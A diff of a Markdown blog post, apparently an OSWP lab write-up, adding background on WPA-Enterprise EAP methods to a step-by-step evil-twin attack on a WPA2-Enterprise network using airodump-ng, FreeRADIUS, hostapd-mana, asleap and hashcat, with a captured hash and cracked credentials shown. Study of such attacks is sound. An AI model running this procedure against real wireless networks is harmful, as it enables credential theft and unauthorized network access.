@@ -7,11 +7,35 @@ categories = ["Wireless Networking"]
 date = 2025-04-21
 tags = ["WPA2", "enterprise", "hostapd-mana", "freeradius", "oswp"]
 +++
+## WPA Enterprise
+WPA Enterprise uses `Extensible Authentication Protocol (EAP)`. which is a framework for authentication, which allows a number of different authentication methods.
+![WPA enterprise network](WPA2-ENTERPRISE.png)
+### Common EAP Methods
+#### **EAP-TLS**  
+- **What It Does:**  
+  - Both the client and the server present certificates.  
+- **How It Works:**  
+  - Mutual authentication occurs; no username or password is needed.  
+  - Considered very secure due to certificate-based validation.  
+#### **EAP-TTLS**  
+- **What It Does:**  
+  - Only the server needs a certificate.  
+- **How It Works:**  
+  - The client verifies the server’s certificate first.  
+  - A secure tunnel is created to transmit user credentials (e.g., via `PAP`, `CHAP`, or `MS-CHAPv2`).  
+#### **PEAP**  
+- **What It Does:**  
+  - Only the server has a certificate.  
+- **How It Works:**  
+  - After verifying the server, a secure tunnel is established.  
+  - The client authenticates with a username and password (typically `MS-CHAPv2`).  
+### What Is the PMK in WPA‑Enterprise?
 
-## Introduction
+In WPA‑Enterprise, instead of everyone sharing one static key, the authentication is handled by a centralized server (usually via Remote Authentication Dial-In User Service (RADIUS)). Once a user (or device) successfully authenticates with the server, a secret key called the **Pairwise Master Key (PMK)** is generated for that specific session. This PMK is a 256‑bit key that is used as the “root” for creating other temporary keys (like the Pairwise Transient Key, PTK) that actually encrypt your traffic.
+## Attacking WPA Enterprise
+
 In this article, we are going to attack the WPA2-MGT wireless enterprise network.
 To attack WPA Enterprise we build our own rogue AP, but to do so, we need to create a certificate. We need to make the certificate with the same information as our target. To capture the information, we need to capture a handshake like in WPA2 attacks.
-
 ## Capturing Network Information
 First, we need to enable monitor mode on our wireless interface:
 ```bash
@@ -19,12 +43,10 @@ sudo airmon-ng start wlan0
 ```
  
 ![Output of airmon-ng starting monitor mode on wlan0](Pasted%20image%2020250316164117.png)
-
 Now we can scan for networks in all bands:
 ```bash
 sudo airodump-ng wlan0mon --band abg
 ```
-
 ![Output of airodump-ng scanning for networks](Pasted%20image%2020250316165349.png)
 
 Once we've identified our target network, we can focus our capture on it:
@@ -46,13 +68,11 @@ Using [`pcapFilter.sh`](https://gist.github.com/r4ulcl/f3470f097d1cd21dbc5a23888
 
 ![Certificate extraction using pcapFilter.sh script](Pasted%20image%2020250317083757.png)
 The certificate is now extracted and saved in `/tmp/certs` folder.
-
 ## Setting Up FreeRADIUS
 Now we need to install `freeradius` server:
 ```bash
 sudo apt install freeradius
 ```
-
 Go to /etc/freeradius/3.0/certs and open `ca.cnf` and `server.cnf`:
 
 ![Directory listing of FreeRADIUS certificate folder](Pasted%20image%2020250317093614.png)
@@ -60,13 +80,11 @@ Go to /etc/freeradius/3.0/certs and open `ca.cnf` and `server.cnf`:
 ```bash
 nano ca.cnf
 ```
-
 ![Editing ca.cnf configuration file](Pasted%20image%2020250317094300.png)
 
 ```bash
 nano server.cnf
 ```
-
 ![Editing server.cnf configuration file](Pasted%20image%2020250317094937.png)
 
 After that we do the following commands under `/etc/freeradius/3.0/certs` to generate `Diffie Hellman key` for `hostapd-mana`:
@@ -77,10 +95,9 @@ rm dh
 ```bash
 make
 ```
-
 ![Generating Diffie-Hellman parameters](Pasted%20image%2020250317095344.png)
-
 ## Creating a Rogue Access Point
+
 Next, create a file called `mana.eap_user` in `/etc/hostapd-mana/mana.eap_user` folder:
 ```bash
 * PEAP,TTLS,TLS,FAST
@@ -148,14 +165,11 @@ Start the Rogue AP:
 ```bash
 sudo hostapd-mana mana-network.conf
 ```
-
 ![Hostapd-mana running the rogue access point](Pasted%20image%2020250317144847.png)
-
 ## Password Cracking
 Using **asleap** to crack the password hash. We can copy/paste the output, starting with **asleap**, and append the wordlist to the -W parameter:
 
 ![Asleap tool cracking the captured credentials](Pasted%20image%2020250317155259.png)
-
 **Credentials obtained:**
 - Password: `bulldogs1234`
 - User: `juan.tr` 
@@ -165,10 +179,8 @@ We can also use the `hashcat` for password cracking:
 ```bash
 hashcat -a 0 -m 5500 juan.tr::::b74a163726ec4f0d75215c9de156ba47802b4cc355b7b7af:16e896c22be272dd /root/rockyou-top100000.txt --force
 ```
-
 ## Connecting to the Network
 We connect to the AP using wpa_supplicant, first we create the conf file for the network.
-
 Create network.conf:
 ```bash
 network={
@@ -187,7 +199,6 @@ Start connecting using wpa_supplicant:
 ```bash
 wpa_supplicant -c network.conf -i wlan0
 ```
-
 Get the IP address:
 ```bash
 sudo dhclient wlan0
